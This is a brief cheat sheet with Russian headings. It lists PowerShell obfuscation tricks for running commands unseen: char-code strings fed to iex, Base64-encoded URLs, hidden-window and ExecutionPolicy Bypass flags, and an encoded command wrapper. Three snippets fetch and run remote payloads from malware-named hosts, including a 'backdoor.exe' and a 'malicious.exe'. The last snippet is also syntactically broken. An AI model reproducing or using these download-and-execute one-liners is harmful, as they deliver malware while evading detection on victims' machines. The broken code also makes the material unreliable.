## Простая обфускация с использованием строк
```cmd
$e=([char]0x68+[char]0x65+[char]0x6C+[char]0x6C+[char]0x6F);iex $e
```
## Использование Base64 для кодирования
```powershell
powershell.exe -Command "$s = [Sy\u0073tem.Text.En\u0063oding]::ASCII.GetString([Sy\u0073tem.Convert]::FromBase64String('aHR0cHM6Ly9tYWwwd2FyZS5ydS9wYXlsb2FkX3NvbWU=')); iwr $s -UseBasicParsing | iex"
```
## Использование Base64 для кодирования с праметрами запуска PS
```powershell
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -W Hidden -Command "$s = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('aHR0cDovL2FiYzkxMXRlc3RLSVJBbGluay5jb20vZC9iYWNrZG9vcjEyMy5leGU=')); iwr $s -OutFile backdoor.exe; Start-Process .\backdoor.exe"
```
## Использование строковых манипуляций для скрытия команды
```powershell
$cmd = 'powershell.exe -nop -w hidden -e ' + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('Invoke-WebRequest "http://evil-some.com/malicious123.exe" -OutFile "malicious.exe"; Start-Process "malicious.exe"'))) iex ($cmd)
```
